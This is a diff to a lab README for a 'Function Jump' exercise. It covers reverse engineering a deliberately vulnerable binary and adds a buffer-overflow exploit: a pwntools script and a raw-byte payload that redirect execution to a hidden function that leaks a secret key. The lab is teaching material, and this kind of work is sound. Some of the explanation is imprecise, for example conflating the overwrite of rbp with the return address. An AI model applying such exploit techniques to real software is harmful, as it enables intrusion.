@@ -1,7 +1,6 @@
 # FUNCTION JUMP
 <a href='' target="_blank"><img alt='Cyber Security' src='https://img.shields.io/badge/Cyber_Security-100000?style=for-the-badge&logo=Cyber Security&logoColor=B60000&labelColor=FFA200&color=FFA200'/></a>
-
-(Work In Progress)  
+ 
 Another common mistake is leaving code that compromises confidential information or secrets in the codebase—even if it’s not directly accessible—because the call has been commented out. For example, in the following code, the function *read_encrypt_key* is commented out, yet the function itself remains in the codebase (and, as we’ll see later, still appears in the binary).
 
 ```c
@@ -49,7 +48,7 @@ Bash
 vagrant up
 ```
 
-Important: This command will take several minutes the first time you run it. It has to download the base Ubuntu operating system, install all the required tools (radare2, Ghidra, Cutter, etc.), and compile the lab binary. You will see a lot of text scrolling in your terminal.
+Important: While the MV will be load short after, the provisioning will take several minutes the first time you run it. It has to download the base Ubuntu operating system, install all the required tools (radare2, Ghidra, Cutter, etc.). You will see a lot of text scrolling in your terminal. Wait till the terminal shows the message "Provisioning complete. You may need to reboot with 'vagrant reload'." This means the VM has been successfully created and is running.
 
 #### 2. Login to the Virtual Machine
 You will be presented with a login screen. Use the following credentials:
@@ -57,7 +56,18 @@ You will be presented with a login screen. Use the following credentials:
 + Username: vagrant
 + Password: vagrant
 
-#### 3. How to Stop the VM
+#### 3. Compile the Lab Binary
+To compile from the terminal go to the lab folder at:
+```shell
+cd /home/vagrant/Desktop/cyber-lab
+```
+Use the make command to compile the binary:
+```shell
+make
+```
+This will create the binary file `jump_function.sh` in the same folder.
+
+#### 4. How to Stop the VM
 When you are finished, you can shut down the VM in one of two ways:
 
 1. From the VM's Desktop: Use the menu in the top-right corner to log out or shut down the machine, just like on a normal computer.
@@ -90,7 +100,7 @@ Similar to the previous section, we can list all the strings in the binary. In t
 
 When we run the program, it prompts us for a key to decrypt a message. If we enter a short text, it simply prints the message "Data Encrypted"; however, if we enter a long message, an error occurs. Since the error is a *segmentation fault*, we can deduce that the program does not limit the size of the data being input by the user.
 
-![Alt text](images/image.png)
+![alt text](images/image-16.png)
 
 The next step is to inspect the list of functions available in the binary. We’ll use [Cutter](https://cutter.re/) for this. After opening the jump_function.sh binary in Cutter, you can see a list of functions on the left side. Among them is one that may be of interest: *sym.read_encrypt_key*. Note that, even though this function was commented out in the source code, it still appears in the compiled binary.
 
@@ -100,7 +110,7 @@ Given the earlier error and the fact that the function still exists in the binar
 
 ![Alt text](images/image-2.png)
 
-Note that if [Ghidra](https://ghidra-sre.org) is installed, you can actually view the decompiled code, although it may be a bit difficult to read.
+Note that if [Ghidra](https://ghidra-sre.org) is installed, you can actually see the decompiled code, although it may be a bit difficult to read.
 
 ## Debugging
 We can debug the binary using [Radare2](https://rada.re/n/). First, ensure that Radare2 is installed, then begin the debugging process with the following command:
@@ -117,7 +127,7 @@ dc
 
 ![Alt text](images/image-4.png)
 
-If you want to see the disassembly while debugging, use the vc command to enter Visual Mode.
+If you want to see the disassembly while debugging, use the "v" command to enter Visual Mode.
 
 We’ll place a second breakpoint at the echo call, which occurs right after the program reads the user input. By using Visual Mode, you can locate the address of the instruction — note that it may differ from the address shown in the screenshot. After setting the breakpoint, use *dc* to continue the program execution.
 
@@ -133,10 +143,62 @@ Without the overflow, the memory appears as follows. Notice that the *rbp* regis
 
 ![Alt text](images/image-11.png)
 
+Note that the *rbp* register is used to store the base pointer of the current stack frame. If we overwrite it, we can change the return address of the function, allowing us to jump to a different function or even execute arbitrary code.
+
+We can look for the address of the *sym.read_encrypt_key* function using he Visual Mode and looking for the function.
+![alt text](images/image-17.png)
+
 ## Exploitation
 
 ### PayLoad
-(WIP) This section is under active development and will be updated soon...
+We can exploit this vulnerability by crafting a payload that overwrites the *rbp* register with the address of the *sym.read_encrypt_key* function. This way, when the program attempts to return from the current function, it will jump to *sym.read_encrypt_key* instead.
+
+We can use the *pwn* tool from [pwntools](https://docs.pwntools.com/en/stable/) to create the payload. First, ensure that pwntools is installed in your Python environment. Then, you can run the following script:
+
+```python
+from pwn import *
+# Start the process
+p = process("./jump_function.sh")
+# Get the address of the read_encrypt_key function
+read_encrypt_key_addr = p64(0x55555555524f)  # Replace with the actual address
+# Create the payload
+payload = b"A" * 18  # Fill the buffer with 'A's (adjust the size as needed)
+payload += read_encrypt_key_addr  # Overwrite rbp with the address
+# Send the payload
+p.sendline(payload)
+# Interact with the process
+p.interactive()
+```
+
+Or we can print the payload directly in the terminal for the address 0x55555555524f:
+```python
+import sys
+
+# Offset, confirmed with radare2.
+padding = b'A' * 18
+
+# Address, as raw bytes, with no extra nulls.
+address_bytes = b'\x4f\x52\x55\x55\x55\x55'
+
+# The newline character
+newline = b'\n'
+
+payload = padding + address_bytes + newline
+
+# Write the raw bytes directly to the output buffer.
+sys.stdout.buffer.write(payload)  
+```
+
+This will print a string of 'A's followed by the address of the *sym.read_encrypt_key* function. You can then pipe this output into the program:
+```shell
+python3 payload.py | ./jump_function.sh
+```
+
+This will display the secret key **super_sEC** that the *sym.read_encrypt_key* function prints, effectively exploiting the vulnerability.
+
+![alt text](images/image-18.png)
+
+Note that the address `0x4f\x52\x55\x55\x55\x55\x55\x55` is just an example; you need to replace it with the actual address of the *sym.read_encrypt_key* function obtained from Radare2.
 
 ## OS and Compiler Safeguards
 These types of vulnerabilities use buffer overflows to modify the memory stack. Over the years, both compilers and operating systems have implemented safeguards—such as Stack Canaries (also known as Stack Guard), Address Space Layout Randomization (ASLR), the No-Execution bit, and Data Execution Prevention (DEP)—to prevent this type of attack. Although these protections make it more difficult for a malicious actors to exploit buffer overflows, they can still be bypassed or circumvented.
